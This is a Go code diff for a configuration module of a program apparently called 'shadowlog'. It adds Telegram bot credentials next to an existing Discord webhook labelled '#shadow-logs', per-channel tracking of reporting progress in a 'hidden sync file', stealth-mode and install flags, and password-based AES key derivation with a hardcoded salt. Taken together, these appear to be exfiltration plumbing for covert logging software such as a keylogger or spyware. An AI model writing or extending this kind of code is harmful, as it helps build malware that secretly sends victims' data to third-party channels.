@@ -16,20 +16,40 @@ import (
 
 // Config represents the application settings.
 type Config struct {
-	WebhookURL  string `json:"webhook_url"`
-	LogLocal    bool   `json:"log_local"`
-	Interval    int    `json:"interval"` // in seconds
-	LastSentIndex int  `json:"last_sent_index"` // Track Discord reporting progress
-	IsInstalled bool   `json:"-"`        // Runtime only status
-	StealthMode bool   `json:"-"`        // Runtime only status
+	WebhookURL          string `json:"webhook_url"`          // Discord webhook (→ #shadow-logs)
+	TelegramToken       string `json:"telegram_token"`       // Telegram Bot API token
+	TelegramChatID      string `json:"telegram_chat_id"`     // Telegram chat/channel ID
+	EncryptionPassword  string `json:"encryption_password"`  // User-set password for AES key migration
+	LogLocal            bool   `json:"log_local"`
+	Interval            int    `json:"interval"`             // in seconds
+	IsInstalled         bool   `json:"-"`                    // Runtime only status
+	StealthMode         bool   `json:"-"`                    // Runtime only status
 }
 
-// GetEncryptionKey derives a machine-specific 32-byte key for AES-256.
+// SyncState tracks reporting progress independently of the main config.
+type SyncState struct {
+	LastSentIndex   int `json:"dis_idx"`
+	LastSentTGIndex int `json:"tg_idx"`
+}
+
+// encryptionPassword is the runtime password used for key derivation.
+// Set during config load.
+var encryptionPassword string
+
+// SetEncryptionPassword sets the password used for AES key derivation.
+func SetEncryptionPassword(password string) {
+	encryptionPassword = password
+}
+
+// GetEncryptionKey derives a 32-byte AES-256 key from the user-set password.
+// Falls back to MachineGuid if no password is set (backward compatibility).
 func GetEncryptionKey() []byte {
-	id := GetMachineID()
-	// Salted hash for better security.
+	seed := encryptionPassword
+	if seed == "" {
+		seed = GetMachineID()
+	}
 	salt := "shadowlog_v2_salt_9283"
-	hash := sha256.Sum256([]byte(id + salt))
+	hash := sha256.Sum256([]byte(seed + salt))
 	return hash[:]
 }
 
@@ -62,6 +82,11 @@ func LoadConfig() (*Config, error) {
 		// Double-check for JSON "null" which results in a nil pointer.
 		if cfg == nil {
 			return nil, fmt.Errorf("corrupt config: null value")
+		}
+
+		// Set encryption password for runtime use.
+		if cfg.EncryptionPassword != "" {
+			SetEncryptionPassword(cfg.EncryptionPassword)
 		}
 
 		return cfg, nil
@@ -109,6 +134,24 @@ func SaveConfig(cfg *Config) error {
 		content += "\n"
 	}
 	return os.WriteFile(path, []byte(content), 0600)
+}
+
+// LoadSyncState reads the synchronization progress from the hidden sync file.
+func LoadSyncState() *SyncState {
+	state := &SyncState{}
+	path := GetSyncPath()
+	data, err := os.ReadFile(path)
+	if err == nil {
+		json.Unmarshal(data, &state)
+	}
+	return state
+}
+
+// SaveSyncState writes the synchronization progress to the hidden sync file.
+func SaveSyncState(state *SyncState) error {
+	path := GetSyncPath()
+	data, _ := json.Marshal(state)
+	return os.WriteFile(path, data, 0600)
 }
 
 func migrateOldData() {
